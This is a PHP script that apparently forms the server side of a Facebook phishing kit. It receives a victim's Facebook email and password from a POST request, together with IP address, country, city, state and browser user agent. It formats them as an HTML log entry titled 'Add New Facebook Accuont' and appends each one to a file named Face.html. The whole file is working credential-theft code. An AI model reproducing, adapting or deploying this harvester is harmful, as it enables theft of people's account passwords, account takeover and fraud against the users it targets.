<?
if (! ($_SERVER['REQUEST_METHOD'] === 'POST')) {exit;}
     

$date = $_POST['date'];
$_SESSION = $_POST['s'];
$Z118_MESSAGE .= "

<img width='10%' src='http://saveinfo.aba.ae/Facebook/hack-facebook-password-735x400.jpg'>
  <font style='color: rgb(20, 158, 27);'>Add New Facebook Accuont: ".$_SESSION['TIME_DATE']."</font> $date</br>       
                         
   <font style='color: rgb(128, 129, 131);'>&#10112; Face Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['email']."</font></br>
   <font style='color: rgb(128, 129, 131);'>&#10112; Face Password :</font><font style='color: rgb(60, 118, 235);'> ".$_POST['pass']."</font></br>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name/CITY/STATE:</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_LOOKUP_COUNTRY_']."/".$_SESSION['_LOOKUP_CITY_']."/".$_SESSION['_LOOKUP_STATE_']."</font>
   </br>
   
   <font style='color: rgb(128, 129, 131);'>IP:</font><font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://ip-api.com/".$_SESSION['_ip_']."'>".$_SESSION['_ip_']."</a></font></br>
   <font style='color:#9c0000;'></font> [User-Agent] = <font style='color:#0070ba;'>".$_POST['b']."</font>
   </br>
   =====================================================================================
   </br>
   ";
   
   $f = fopen("Face.html", "a");
	    fwrite($f, $Z118_MESSAGE);


fclose($f);
   
   
   echo 'success';


?>